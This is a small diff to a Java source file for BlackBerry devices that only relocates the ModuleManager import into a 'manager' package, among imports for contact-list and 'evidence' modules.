@@ -22,7 +22,6 @@ import net.rim.blackberry.api.pdap.BlackBerryContact;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.ModuleManager;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -31,6 +30,7 @@ import blackberry.evidence.EvidenceType;
 import blackberry.evidence.Markup;
 import blackberry.fs.Path;
 import blackberry.interfaces.UserAgent;
+import blackberry.manager.ModuleManager;
 import blackberry.utils.Utils;
 
 /**
